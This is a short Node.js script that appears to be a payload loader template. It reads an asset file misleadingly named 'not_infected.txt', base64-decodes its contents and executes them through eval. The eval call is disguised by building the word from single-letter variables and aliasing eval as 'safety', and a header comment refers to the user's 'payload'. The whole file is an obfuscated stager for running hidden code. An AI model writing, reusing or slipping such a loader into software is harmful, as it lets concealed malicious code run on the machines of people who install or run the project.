//Dependencies - Add more dependencies here that you used in your payload
const Base_64 = require("base-64")
const Path = require("path")
const Fs = require("fs")

//Variables
const _252 = "e"
const _427 = "v"
const _612 = "a"
const _527 = "l"

const _1_ = "("
const _2_ = ")"

const safety = eval

const Not_Infected = Fs.readFileSync(Path.resolve(__dirname, "assets", "not_infected.txt"), "utf8")

//Main
var to_exec = ""
var to_normal_result = ""

for( i in Not_Infected.split("\n") ){
    to_normal_result += Not_Infected.split("\n")[i]
}

to_exec = Base_64.decode(to_normal_result)

safety(`${_252 + _427 + _612 + _527 + _1_ + to_exec + _2_}`)
